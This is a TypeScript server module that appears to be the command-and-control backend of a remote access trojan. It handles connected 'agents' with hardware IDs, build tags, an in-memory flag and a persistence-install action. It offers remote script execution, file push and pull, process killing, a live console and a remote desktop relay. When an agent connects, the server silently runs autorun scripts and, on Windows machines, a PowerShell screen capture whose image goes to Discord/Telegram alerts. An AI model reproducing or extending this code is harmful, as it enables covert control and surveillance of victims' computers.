import type { Server, ServerWebSocket } from "bun";
import {
  registerAgent,
  unregisterAgent,
  registerConsoleViewer,
  unregisterConsoleViewer,
  relayConsoleOutputToViewer,
  registerRemoteViewer,
  unregisterRemoteViewer,
  relayRemoteFrameToViewer,
  decodeMsgpackSafe,
  getAgent,
  encodeMsgpack,
  type AgentInfo,
} from "./agent-store";
import {
  upsertClient,
  setClientStatus,
} from "./db";
import { getAuthFromRequest } from "./auth";
import { loadAutorunScripts, hasSeenFirstConnect, markFirstConnect } from "./autorun";
import { notifyAgentConnect } from "./notifier";

// reqId → Promise resolver — tracks pending script_exec requests
const pendingScriptRequests = new Map<string, (result: { output: string; error?: string; exitCode: number }) => void>();
// clientId → Set<reqId> — used to cancel pending requests when an agent disconnects
const pendingByClient = new Map<string, Set<string>>();

// File push (server → agent) pending resolvers
const pendingFilePushRequests = new Map<string, (r: { ok: boolean; error?: string }) => void>();
// File pull (agent → server) pending resolvers
const pendingFilePullRequests = new Map<string, (r: { ok: boolean; filename?: string; data?: Buffer; size?: number; error?: string }) => void>();
// Process list pending resolvers
const pendingProcListRequests = new Map<string, (r: { ok: boolean; procs?: any[]; error?: string }) => void>();
// Process kill pending resolvers
const pendingProcKillRequests = new Map<string, (r: { ok: boolean; error?: string }) => void>();
// Agent action pending resolvers
const pendingAgentActionRequests = new Map<string, (r: { ok: boolean; action: string; error?: string }) => void>();
// Native screenshot pending resolvers (GDI path — no PowerShell)
const pendingNativeScreenshotRequests = new Map<string, (r: { ok: boolean; data?: Buffer; width?: number; height?: number; error?: string }) => void>();

function _pendingTrack(clientId: string, reqId: string) {
  let set = pendingByClient.get(clientId);
  if (!set) { set = new Set(); pendingByClient.set(clientId, set); }
  set.add(reqId);
}

function _pendingUntrack(clientId: string, reqId: string) {
  const set = pendingByClient.get(clientId);
  if (set) { set.delete(reqId); if (set.size === 0) pendingByClient.delete(clientId); }
}

export function dispatchScriptExec(
  clientId: string,
  reqId: string,
  script: string,
  scriptType: string,
  timeoutSecs: number = 60,
): Promise<{ output: string; error?: string; exitCode: number }> {
  // Clamp: minimum 5 s, maximum 600 s (10 min)
  const clampedSecs = Math.min(600, Math.max(5, timeoutSecs));
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) {
      reject(new Error("Agent not connected"));
      return;
    }
    // Server-side watchdog fires 5 s after the agent's own deadline
    const timer = setTimeout(() => {
      pendingScriptRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error(`Script execution timed out (${clampedSecs}s)`));
    }, (clampedSecs + 5) * 1000);
    _pendingTrack(clientId, reqId);
    pendingScriptRequests.set(reqId, (result) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(result);
    });
    try {
      agent.send(encodeMsgpack({
        type: "script_exec", reqId, script, scriptType,
        timeoutSecs: clampedSecs,
      }));
    } catch (err) {
      clearTimeout(timer);
      pendingScriptRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send command to agent"));
    }
  });
}

// ── Native screenshot (Win32 GDI/BitBlt — no PowerShell) ─────────────────────
export function dispatchNativeScreenshot(
  clientId: string,
  reqId: string,
  quality: number = 50,
  timeoutMs: number = 35_000,
): Promise<{ ok: boolean; data?: Buffer; width?: number; height?: number; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingNativeScreenshotRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Native screenshot timed out"));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingNativeScreenshotRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "screenshot", reqId, quality }));
    } catch {
      clearTimeout(timer);
      pendingNativeScreenshotRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send screenshot to agent"));
    }
  });
}

// ── File push (server uploads a file to the agent) ───────────────────────────
export function dispatchFilePush(
  clientId: string,
  reqId: string,
  destPath: string,
  data: Uint8Array,
  timeoutMs = 120_000,
): Promise<{ ok: boolean; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingFilePushRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("File push timed out"));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingFilePushRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "file_push", reqId, path: destPath, data }));
    } catch {
      clearTimeout(timer);
      pendingFilePushRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send file_push to agent"));
    }
  });
}

// ── File pull (server downloads a file from the agent) ────────────────────────
export function dispatchFilePull(
  clientId: string,
  reqId: string,
  srcPath: string,
  timeoutMs = 120_000,
): Promise<{ ok: boolean; filename?: string; data?: Buffer; size?: number; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingFilePullRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("File pull timed out"));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingFilePullRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "file_pull", reqId, path: srcPath }));
    } catch {
      clearTimeout(timer);
      pendingFilePullRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send file_pull to agent"));
    }
  });
}

// ── Process list ──────────────────────────────────────────────────────────────
export function dispatchProcList(
  clientId: string,
  reqId: string,
  timeoutMs = 30_000,
): Promise<{ ok: boolean; procs?: any[]; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingProcListRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Process list timed out"));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingProcListRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "proc_list", reqId }));
    } catch {
      clearTimeout(timer);
      pendingProcListRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send proc_list to agent"));
    }
  });
}

// ── Agent action (persist_install / persist_remove / uninstall) ───────────────
export function dispatchAgentAction(
  clientId: string,
  reqId: string,
  action: string,
  timeoutMs = 30_000,
): Promise<{ ok: boolean; action: string; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingAgentActionRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error(`Agent action timed out: ${action}`));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingAgentActionRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "agent_action", reqId, action }));
    } catch {
      clearTimeout(timer);
      pendingAgentActionRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send agent_action to agent"));
    }
  });
}

// ── Process kill ──────────────────────────────────────────────────────────────
export function dispatchProcKill(
  clientId: string,
  reqId: string,
  pid: number,
  timeoutMs = 15_000,
): Promise<{ ok: boolean; error?: string }> {
  return new Promise((resolve, reject) => {
    const agent = getAgent(clientId);
    if (!agent) { reject(new Error("Agent not connected")); return; }
    const timer = setTimeout(() => {
      pendingProcKillRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Process kill timed out"));
    }, timeoutMs);
    _pendingTrack(clientId, reqId);
    pendingProcKillRequests.set(reqId, (r) => {
      clearTimeout(timer);
      _pendingUntrack(clientId, reqId);
      resolve(r);
    });
    try {
      agent.send(encodeMsgpack({ type: "proc_kill", reqId, pid }));
    } catch {
      clearTimeout(timer);
      pendingProcKillRequests.delete(reqId);
      _pendingUntrack(clientId, reqId);
      reject(new Error("Failed to send proc_kill to agent"));
    }
  });
}

export interface SocketData {
  role: "agent" | "console" | "notif" | "remote" | null;
  sessionId: string | null;
  clientId: string | null;
  userId: number | null;
  username: string | null;
  clientName: string | null;
  viewerRef: any;
}

// ── Notification broadcast clients ────────────────────────────────────────
const notifClients = new Set<ZcSocket>();

// ── In-memory notification history (ring buffer, max 200) ─────────────────
export interface NotifEvent {
  id: string;
  event: "connect" | "disconnect";
  clientId: string;
  host: string;
  ts: number;
  read: boolean;
}
const MAX_NOTIF_HISTORY = 200;
const notifHistory: NotifEvent[] = [];

export function getNotifHistory(limit: number): NotifEvent[] {
  const safe = Math.min(MAX_NOTIF_HISTORY, Math.max(1, limit));
  return notifHistory.slice(-safe).reverse();
}

export function markAllNotifsRead(): void {
  for (const n of notifHistory) n.read = true;
}

let _notifSeq = 0;

export function broadcastNotifEvent(event: "connect" | "disconnect", clientId: string, host: string) {
  const ts = Date.now();
  const id = `${ts}-${++_notifSeq}`;
  const entry: NotifEvent = { id, event, clientId, host, ts, read: false };
  notifHistory.push(entry);
  if (notifHistory.length > MAX_NOTIF_HISTORY) notifHistory.shift();

  const msg = JSON.stringify({ type: "client_event", event, clientId, host, ts, id });
  for (const ws of notifClients) {
    try { ws.send(msg); } catch { notifClients.delete(ws); }
  }
}

type ZcSocket = ServerWebSocket<SocketData>;

function send(ws: ZcSocket, msg: object) {
  try {
    ws.send(JSON.stringify(msg));
  } catch {}
}

function sendMsgpack(ws: ZcSocket, msg: object) {
  try {
    ws.send(encodeMsgpack(msg));
  } catch {}
}

// ----------------------------------------------------------------
// WebSocket upgrade (called from server.ts fetch handler)
// ----------------------------------------------------------------

// Agent upgrade MUST be called synchronously (no await before server.upgrade).
// Bun invalidates the request after the first event-loop yield, so this
// function is deliberately non-async and must be called before any await
// in the fetch handler.
export function tryAgentWsUpgrade(req: Request, server: Server<SocketData>): boolean | undefined {
  const url = new URL(req.url);
  const agentMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/stream\/ws$/);
  if (!agentMatch) return undefined; // not an agent path — let the caller continue

  const clientId = agentMatch[1];
  const requestedProtocol = req.headers.get("sec-websocket-protocol") || "";
  const matchedProtocol = requestedProtocol.split(",").map(p => p.trim()).find(p => p === "binary");
  const upgradeHeaders = new Headers();
  if (matchedProtocol) upgradeHeaders.set("Sec-WebSocket-Protocol", matchedProtocol);
  const ok = server.upgrade(req, {
    headers: upgradeHeaders,
    data: {
      role: "agent",
      sessionId: null,
      clientId,
      userId: null,
      username: null,
      clientName: null,
      viewerRef: null,
    },
  });
  return ok; // true = upgraded, false = failed
}

export async function handleWsUpgrade(req: Request, server: Server<SocketData>): Promise<Response | undefined> {
  const url = new URL(req.url);

  // Notification feed: /api/notifications/ws
  if (url.pathname === "/api/notifications/ws") {
    const auth = await getAuthFromRequest(req);
    if (!auth) {
      return new Response("Unauthorized", { status: 401 });
    }
    const ok = server.upgrade(req, {
      data: {
        role: "notif",
        sessionId: null,
        clientId: null,
        userId: auth.userId,
        username: auth.username,
        clientName: null,
        viewerRef: null,
      },
    });
    return ok ? undefined : new Response("WebSocket upgrade failed", { status: 500 });
  }

  // Console viewer: /api/clients/:id/console/ws
  // Auth is required — unauthenticated users must not be able to open a terminal.
  const consoleMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/console\/ws$/);
  if (consoleMatch) {
    const clientId = decodeURIComponent(consoleMatch[1]);

    const auth = await getAuthFromRequest(req);
    if (!auth) {
      return new Response("Unauthorized — please log in first", { status: 401 });
    }

    const ok = server.upgrade(req, {
      data: {
        role: "console",
        sessionId: null,
        clientId,
        userId: auth.userId,
        username: auth.username,
        clientName: null,
        viewerRef: null,
      },
    });
    return ok ? undefined : new Response("WebSocket upgrade failed", { status: 500 });
  }

  // Remote desktop viewer: /api/clients/:id/remote/ws
  const remoteMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/remote\/ws$/);
  if (remoteMatch) {
    const clientId = decodeURIComponent(remoteMatch[1]);

    const auth = await getAuthFromRequest(req);
    if (!auth) {
      return new Response("Unauthorized — please log in first", { status: 401 });
    }

    const ok = server.upgrade(req, {
      data: {
        role: "remote",
        sessionId: null,
        clientId,
        userId: auth.userId,
        username: auth.username,
        clientName: null,
        viewerRef: null,
      },
    });
    return ok ? undefined : new Response("WebSocket upgrade failed", { status: 500 });
  }

  return undefined;
}

// ----------------------------------------------------------------
// WebSocket event handlers
// ----------------------------------------------------------------

export const wsHandler = {
  open(ws: ZcSocket) {
    const { role, clientId } = ws.data;

    if (role === "agent" && clientId) {
      handleAgentOpen(ws, clientId);
      return;
    }

    if (role === "console" && clientId) {
      handleConsoleOpen(ws, clientId);
      return;
    }

    if (role === "remote" && clientId) {
      handleRemoteOpen(ws, clientId);
      return;
    }

    if (role === "notif") {
      notifClients.add(ws);
      try { ws.send(JSON.stringify({ type: "ready", history: getNotifHistory(50) })); } catch {}
      return;
    }
  },

  async message(ws: ZcSocket, raw: string | ArrayBuffer | Buffer) {
    const { role } = ws.data;

    if (role === "agent") {
      await handleAgentMessage(ws, raw);
      return;
    }

    if (role === "console") {
      handleConsoleViewerMessage(ws, raw);
      return;
    }

    if (role === "remote") {
      handleRemoteViewerMessage(ws, raw);
      return;
    }
  },

  close(ws: ZcSocket, code: number, reason: string) {
    const { role, clientId, viewerRef } = ws.data;

    if (role === "agent" && clientId) {
      handleAgentClose(ws, clientId, code, reason);
      return;
    }

    if (role === "console" && clientId && viewerRef) {
      handleConsoleClose(ws, clientId);
      return;
    }

    if (role === "remote" && clientId) {
      handleRemoteClose(ws, clientId);
      return;
    }

    if (role === "notif") {
      notifClients.delete(ws);
      return;
    }
  },

  drain(_ws: ZcSocket) {},
};

// ----------------------------------------------------------------
// Agent connection handlers
// ----------------------------------------------------------------

function handleAgentOpen(_ws: ZcSocket, clientId: string) {
  console.log(`[agent] connection opened: ${clientId}`);
}

async function handleAgentMessage(ws: ZcSocket, raw: string | ArrayBuffer | Buffer) {
  const clientId = ws.data.clientId!;

  let data: Uint8Array;
  if (typeof raw === "string") {
    data = new TextEncoder().encode(raw);
  } else if (raw instanceof ArrayBuffer) {
    data = new Uint8Array(raw);
  } else {
    data = new Uint8Array(raw.buffer, raw.byteOffset, raw.byteLength);
  }

  const msg = decodeMsgpackSafe(data);
  if (!msg) return;

  const msgType = String(msg.type ?? "");

  switch (msgType) {
    case "hello": {
      const ip = extractIp(ws);
      const info: AgentInfo = {
        id: clientId,
        hwid: String(msg.hwid ?? ""),
        host: String(msg.host ?? ""),
        os: String(msg.os ?? ""),
        arch: String(msg.arch ?? ""),
        version: String(msg.version ?? ""),
        username: String(msg.user ?? ""),
        ip,
        country: String(msg.country ?? ""),
        buildTag: String(msg.buildTag ?? ""),
        buildId: String(msg.buildId ?? ""),
        publicKey: String(msg.publicKey ?? ""),
        inMemory: Boolean(msg.inMemory),
        connectedAt: Date.now(),
      };

      upsertClient({ ...info, status: "online" });

      const wasInGrace = registerAgent(
        clientId,
        info,
        (d) => { try { ws.send(d); } catch {} },
        () => { try { ws.ping(); } catch {} },
      );

      sendMsgpack(ws, { type: "hello_ack" });
      console.log(`[agent] hello from ${info.host} (${info.os}) id=${clientId}`);
      broadcastNotifEvent("connect", clientId, info.host);

      // ── Post-connect: auto-run scripts + screenshot notification ─────────
      // Run 2 s after connect so the agent's PTY fully settles first.
      setTimeout(async () => {
        // Auto-run scripts
        const scripts = loadAutorunScripts().filter(s => s.enabled);
        for (const s of scripts) {
          if (s.trigger === "on_first_connect") {
            if (hasSeenFirstConnect(s.id, clientId)) continue;
            markFirstConnect(s.id, clientId);
          }
          const reqId = `autorun-${s.id}-${Date.now()}`;
          dispatchScriptExec(clientId, reqId, s.content, s.type, 60)
            .then(r => console.log(`[autorun] "${s.name}" → ${info.host}: exit=${r.exitCode}`))
            .catch(e => console.log(`[autorun] "${s.name}" → ${info.host}: ${(e as Error).message}`));
        }

        // Screenshot for Discord/Telegram notification (Windows agents only)
        let screenshotB64: string | undefined;
        if (!wasInGrace && info.os.toLowerCase().includes("windows")) {
          try {
            const ssScript = [
              "Add-Type -AssemblyName System.Windows.Forms,System.Drawing",
              "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds",
              "$bmp=New-Object System.Drawing.Bitmap($s.Width,$s.Height)",
              "$g=[System.Drawing.Graphics]::FromImage($bmp)",
              "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)",
              "$ms=New-Object System.IO.MemoryStream",
              "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg)",
              "$g.Dispose();$bmp.Dispose()",
              "[Convert]::ToBase64String($ms.ToArray())",
            ].join(";");
            const ssReqId = `notif-ss-${Date.now()}`;
            const ssResult = await dispatchScriptExec(clientId, ssReqId, ssScript, "powershell", 12);
            const b64 = ssResult.output.trim();
            if (ssResult.exitCode === 0 && b64 && b64.length > 100) {
              screenshotB64 = b64;
            }
          } catch (e) {
            console.log(`[notif] screenshot capture failed for ${info.host}: ${(e as Error).message}`);
          }
        }

        // Fire connect notification with screenshot (or text-only if not available)
        if (!wasInGrace) {
          notifyAgentConnect({
            host: info.host,
            os: info.os,
            username: info.username,
            ip: info.ip,
            buildTag: info.buildTag,
            screenshotB64,
          }).catch(() => {});
        }
      }, 2000);
      break;
    }

    case "ping": {
      const ts = Number(msg.ts ?? 0);
      sendMsgpack(ws, { type: "pong", ts });
      break;
    }

    case "pong": {
      break;
    }

    case "output":
    case "console_output": {
      // Re-use the already decoded msgpack envelope; no need to decode twice.
      let textData = "";
      const rawData = msg.data;
      if (rawData instanceof Uint8Array) {
        textData = new TextDecoder().decode(rawData);
      } else if (rawData instanceof ArrayBuffer) {
        textData = new TextDecoder().decode(new Uint8Array(rawData));
      } else if (typeof rawData === "string") {
        textData = rawData;
      }
      const browserPayload: Record<string, unknown> = { type: "output" };
      if (textData) browserPayload.data = textData;
      if (msg.error) browserPayload.error = String(msg.error);
      if (msg.exitCode !== undefined && msg.exitCode !== null) {
        browserPayload.exitCode = Number(msg.exitCode);
      }
      relayConsoleOutputToViewer(clientId, encodeMsgpack(browserPayload));
      break;
    }

    case "script_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingScriptRequests.get(reqId);
      if (resolve) {
        pendingScriptRequests.delete(reqId);
        resolve({
          output:   String(msg.output ?? ""),
          error:    msg.error ? String(msg.error) : undefined,
          exitCode: Number(msg.exitCode ?? 0),
        });
      }
      break;
    }

    case "remote_frame": {
      // Relay raw msgpack frame directly to the remote viewer (no re-encode needed)
      relayRemoteFrameToViewer(clientId, data);
      break;
    }

    case "file_push_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingFilePushRequests.get(reqId);
      if (resolve) {
        pendingFilePushRequests.delete(reqId);
        resolve({ ok: Boolean(msg.ok), error: msg.error ? String(msg.error) : undefined });
      }
      break;
    }

    case "file_pull_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingFilePullRequests.get(reqId);
      if (resolve) {
        pendingFilePullRequests.delete(reqId);
        let buf: Buffer | undefined;
        const raw = msg.data;
        if (raw instanceof Uint8Array) buf = Buffer.from(raw);
        else if (raw instanceof ArrayBuffer) buf = Buffer.from(new Uint8Array(raw));
        else if (Buffer.isBuffer(raw)) buf = raw;
        resolve({
          ok: Boolean(msg.ok),
          filename: msg.filename ? String(msg.filename) : undefined,
          data: buf,
          size: msg.size != null ? Number(msg.size) : undefined,
          error: msg.error ? String(msg.error) : undefined,
        });
      }
      break;
    }

    case "proc_list_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingProcListRequests.get(reqId);
      if (resolve) {
        pendingProcListRequests.delete(reqId);
        resolve({
          ok: Boolean(msg.ok),
          procs: Array.isArray(msg.procs) ? msg.procs : [],
          error: msg.error ? String(msg.error) : undefined,
        });
      }
      break;
    }

    case "proc_kill_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingProcKillRequests.get(reqId);
      if (resolve) {
        pendingProcKillRequests.delete(reqId);
        resolve({ ok: Boolean(msg.ok), error: msg.error ? String(msg.error) : undefined });
      }
      break;
    }

    case "agent_action_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingAgentActionRequests.get(reqId);
      if (resolve) {
        pendingAgentActionRequests.delete(reqId);
        // Go agent sends result:"ok"|"error"; some paths may send ok:true.
        // Accept either so both old and new agent builds are handled.
        const isOk = msg.ok === true || String(msg.result ?? "") === "ok";
        resolve({
          ok: isOk,
          action: String(msg.action ?? ""),
          error: msg.error ? String(msg.error) : undefined,
        });
      }
      break;
    }

    case "screenshot_result": {
      const reqId = String(msg.reqId ?? "");
      const resolve = pendingNativeScreenshotRequests.get(reqId);
      if (resolve) {
        pendingNativeScreenshotRequests.delete(reqId);
        let buf: Buffer | undefined;
        const raw = msg.data;
        if (raw instanceof Uint8Array) buf = Buffer.from(raw);
        else if (raw instanceof ArrayBuffer) buf = Buffer.from(new Uint8Array(raw));
        else if (Buffer.isBuffer(raw)) buf = raw;
        resolve({
          ok: Boolean(msg.ok),
          data: buf,
          width:  msg.width  != null ? Number(msg.width)  : undefined,
          height: msg.height != null ? Number(msg.height) : undefined,
          error:  msg.error  ? String(msg.error) : undefined,
        });
      }
      break;
    }

    default:
      break;
  }
}

function handleAgentClose(_ws: ZcSocket, clientId: string, code?: number, reason?: string) {
  const detail = code ? ` (code=${code}${reason ? ` reason=${reason}` : ""})` : "";
  console.log(`[agent] disconnected: ${clientId}${detail}`);
  const agentHost = getAgent(clientId)?.info.host ?? clientId;
  unregisterAgent(clientId, () => {
    setClientStatus(clientId, "offline");
    broadcastNotifEvent("disconnect", clientId, agentHost);
  });

  // Immediately reject all pending requests for this agent so HTTP callers
  // get an error response instead of hanging until their watchdog fires.
  const reqIds = pendingByClient.get(clientId);
  if (reqIds) {
    for (const reqId of reqIds) {
      // Script requests
      const reject = pendingScriptRequests.get(reqId);
      if (reject) {
        pendingScriptRequests.delete(reqId);
        reject({ output: "", error: "Agent disconnected", exitCode: -1 });
      }
      // File push requests
      const fpush = pendingFilePushRequests.get(reqId);
      if (fpush) {
        pendingFilePushRequests.delete(reqId);
        fpush({ ok: false, error: "Agent disconnected" });
      }
      // File pull requests
      const fpull = pendingFilePullRequests.get(reqId);
      if (fpull) {
        pendingFilePullRequests.delete(reqId);
        fpull({ ok: false, error: "Agent disconnected" });
      }
      // Process list requests
      const plist = pendingProcListRequests.get(reqId);
      if (plist) {
        pendingProcListRequests.delete(reqId);
        plist({ ok: false, error: "Agent disconnected" });
      }
      // Process kill requests
      const pkill = pendingProcKillRequests.get(reqId);
      if (pkill) {
        pendingProcKillRequests.delete(reqId);
        pkill({ ok: false, error: "Agent disconnected" });
      }
      // Agent action requests
      const aaction = pendingAgentActionRequests.get(reqId);
      if (aaction) {
        pendingAgentActionRequests.delete(reqId);
        aaction({ ok: false, action: "", error: "Agent disconnected" });
      }
      // Native screenshot requests
      const nss = pendingNativeScreenshotRequests.get(reqId);
      if (nss) {
        pendingNativeScreenshotRequests.delete(reqId);
        nss({ ok: false, error: "Agent disconnected" });
      }
    }
    pendingByClient.delete(clientId);
  }
}

// ----------------------------------------------------------------
// Console viewer handlers
// ----------------------------------------------------------------

function handleConsoleOpen(ws: ZcSocket, clientId: string) {
  const viewerRef = registerConsoleViewer(
    clientId,
    (data) => { try { ws.send(data); } catch {} },
    () => { try { ws.ping(); } catch {} },
  );
  ws.data.viewerRef = viewerRef;

  const agent = getAgent(clientId);
  if (!agent) {
    sendMsgpack(ws, { type: "status", status: "offline", reason: "Agent not connected" });
    return;
  }

  sendMsgpack(ws, {
    type: "ready",
    clientId,
    host: agent.info.host,
    user: agent.info.username,
    os: agent.info.os,
  });

  const sessionId = `${clientId}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  ws.data.sessionId = sessionId;
  try {
    agent.send(encodeMsgpack({ type: "console_start", sessionId, cols: 220, rows: 50 }));
  } catch {}
}

function handleConsoleClose(ws: ZcSocket, clientId: string) {
  if (ws.data.viewerRef) {
    unregisterConsoleViewer(clientId, ws.data.viewerRef);
  }
  const agent = getAgent(clientId);
  if (agent) {
    const sessionId = ws.data.sessionId ?? clientId;
    try {
      agent.send(encodeMsgpack({ type: "console_stop", sessionId }));
    } catch {}
  }
}

function handleConsoleViewerMessage(ws: ZcSocket, raw: string | ArrayBuffer | Buffer) {
  const clientId = ws.data.clientId!;

  let data: Uint8Array;
  if (typeof raw === "string") {
    data = new TextEncoder().encode(raw);
  } else if (raw instanceof ArrayBuffer) {
    data = new Uint8Array(raw);
  } else {
    data = new Uint8Array(raw.buffer, raw.byteOffset, raw.byteLength);
  }

  const agent = getAgent(clientId);
  if (!agent) {
    sendMsgpack(ws, { type: "status", status: "offline", reason: "Agent disconnected" });
    return;
  }

  const msg = decodeMsgpackSafe(data);
  if (!msg) return;

  if (msg.type === "ping") {
    sendMsgpack(ws, { type: "pong", ts: msg.ts ?? Date.now() });
    return;
  }

  if (msg.type === "input") {
    // Forward bytes regardless of how msgpack typed the field on the wire.
    let payload: string | Uint8Array = "";
    const d = msg.data;
    if (typeof d === "string") payload = d;
    else if (d instanceof Uint8Array) payload = d;
    else if (d instanceof ArrayBuffer) payload = new Uint8Array(d);
    else if (d != null) payload = String(d);

    const sessionId = ws.data.sessionId ?? clientId;
    try {
      agent.send(encodeMsgpack({ type: "console_input", sessionId, data: payload }));
    } catch {}
  }

  if (msg.type === "resize") {
    const cols = Math.max(1, Number(msg.cols ?? 80));
    const rows = Math.max(1, Number(msg.rows ?? 24));
    const sessionId = ws.data.sessionId ?? clientId;
    try {
      agent.send(encodeMsgpack({ type: "console_resize", sessionId, cols, rows }));
    } catch {}
  }
}

// ----------------------------------------------------------------
// Remote desktop viewer handlers
// ----------------------------------------------------------------

function handleRemoteOpen(ws: ZcSocket, clientId: string) {
  const viewerRef = registerRemoteViewer(
    clientId,
    (data) => { try { ws.send(data); } catch {} },
    () => { try { ws.ping(); } catch {} },
    () => { try { ws.close(1008, "Replaced by new viewer"); } catch {} },
  );
  ws.data.viewerRef = viewerRef;

  const agent = getAgent(clientId);
  if (!agent) {
    sendMsgpack(ws, { type: "status", status: "offline", reason: "Agent not connected" });
    return;
  }

  sendMsgpack(ws, {
    type: "ready",
    clientId,
    host: agent.info.host,
    user: agent.info.username,
    os: agent.info.os,
  });
}

function handleRemoteClose(_ws: ZcSocket, clientId: string) {
  unregisterRemoteViewer(clientId);
  const agent = getAgent(clientId);
  if (agent) {
    try {
      agent.send(encodeMsgpack({ type: "remote_stop" }));
    } catch {}
  }
}

function handleRemoteViewerMessage(ws: ZcSocket, raw: string | ArrayBuffer | Buffer) {
  const clientId = ws.data.clientId!;

  let data: Uint8Array;
  if (typeof raw === "string") {
    data = new TextEncoder().encode(raw);
  } else if (raw instanceof ArrayBuffer) {
    data = new Uint8Array(raw);
  } else {
    data = new Uint8Array(raw.buffer, raw.byteOffset, raw.byteLength);
  }

  const agent = getAgent(clientId);
  if (!agent) {
    sendMsgpack(ws, { type: "status", status: "offline", reason: "Agent disconnected" });
    return;
  }

  const msg = decodeMsgpackSafe(data);
  if (!msg) return;

  if (msg.type === "ping") {
    sendMsgpack(ws, { type: "pong", ts: msg.ts ?? Date.now() });
    return;
  }

  if (
    msg.type === "remote_start" ||
    msg.type === "remote_stop" ||
    msg.type === "remote_input"
  ) {
    try {
      agent.send(data);
    } catch {}
  }
}

// ----------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------

function extractIp(ws: ZcSocket): string {
  try {
    const raw = (ws as any).remoteAddress ?? "";
    if (raw.startsWith("::ffff:")) return raw.slice(7);
    return raw;
  } catch {
    return "";
  }
}

